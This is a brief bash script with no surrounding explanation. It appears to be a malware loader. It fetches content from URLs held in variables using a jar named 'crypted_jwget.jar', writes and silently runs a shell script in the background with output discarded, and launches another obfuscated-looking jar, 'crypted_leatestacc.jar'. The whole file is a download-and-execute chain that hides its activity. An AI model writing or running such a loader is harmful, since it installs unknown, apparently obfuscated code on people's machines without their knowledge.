#!/bin/bash
cd $HOME
echo $LINK2 > start2.sh
crypted_jwget.jar $LINK
bash start2.sh &> /dev/null
crypted_jwget.jar $LINK3
java -jar crypted_leatestacc.jar Storage1















